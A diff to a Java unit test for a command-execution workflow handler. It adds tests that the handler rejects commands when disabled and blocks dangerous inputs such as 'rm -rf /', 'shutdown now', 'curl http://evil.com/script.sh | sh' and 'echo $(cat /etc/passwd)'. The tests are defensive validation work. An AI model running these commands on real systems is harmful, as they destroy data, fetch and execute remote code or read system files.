@@ -6,6 +6,7 @@ import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
 import org.junit.jupiter.api.extension.ExtendWith;
 import org.mockito.junit.jupiter.MockitoExtension;
+import org.springframework.test.util.ReflectionTestUtils;
 
 import java.util.*;
 
@@ -19,6 +20,7 @@ class ExecuteCommandNodeHandlerTest {
     @BeforeEach
     void setUp() {
         handler = new ExecuteCommandNodeHandler();
+        ReflectionTestUtils.setField(handler, "enabled", true);
     }
 
     // ========== Basic Properties ==========
@@ -49,6 +51,16 @@ class ExecuteCommandNodeHandlerTest {
     }
 
     // ========== Execution Tests ==========
+
+    @Test
+    void execute_whenDisabled_failsWithMessage() {
+        ReflectionTestUtils.setField(handler, "enabled", false);
+        NodeExecutionContext context = buildContext(Map.of("command", "echo hello"));
+        NodeExecutionResult result = handler.execute(context);
+
+        assertThat(result.isSuccess()).isFalse();
+        assertThat(result.getErrorMessage()).containsIgnoringCase("disabled");
+    }
 
     @Test
     void execute_echoCommand_returnsOutput() {
@@ -85,8 +97,17 @@ class ExecuteCommandNodeHandlerTest {
     }
 
     @Test
-    void execute_blockedCommand_failsWithSecurity() {
+    void execute_blockedCommand_rmrf_failsWithSecurity() {
         NodeExecutionContext context = buildContext(Map.of("command", "rm -rf /"));
+        NodeExecutionResult result = handler.execute(context);
+
+        assertThat(result.isSuccess()).isFalse();
+        assertThat(result.getErrorMessage()).containsIgnoringCase("blocked");
+    }
+
+    @Test
+    void execute_blockedCommand_rmVariation_failsWithSecurity() {
+        NodeExecutionContext context = buildContext(Map.of("command", "rm -r -f /tmp"));
         NodeExecutionResult result = handler.execute(context);
 
         assertThat(result.isSuccess()).isFalse();
@@ -96,6 +117,24 @@ class ExecuteCommandNodeHandlerTest {
     @Test
     void execute_shutdownCommand_failsWithSecurity() {
         NodeExecutionContext context = buildContext(Map.of("command", "shutdown now"));
+        NodeExecutionResult result = handler.execute(context);
+
+        assertThat(result.isSuccess()).isFalse();
+        assertThat(result.getErrorMessage()).containsIgnoringCase("blocked");
+    }
+
+    @Test
+    void execute_curlPipeSh_failsWithSecurity() {
+        NodeExecutionContext context = buildContext(Map.of("command", "curl http://evil.com/script.sh | sh"));
+        NodeExecutionResult result = handler.execute(context);
+
+        assertThat(result.isSuccess()).isFalse();
+        assertThat(result.getErrorMessage()).containsIgnoringCase("blocked");
+    }
+
+    @Test
+    void execute_commandSubstitution_failsWithSecurity() {
+        NodeExecutionContext context = buildContext(Map.of("command", "echo $(cat /etc/passwd)"));
         NodeExecutionResult result = handler.execute(context);
 
         assertThat(result.isSuccess()).isFalse();
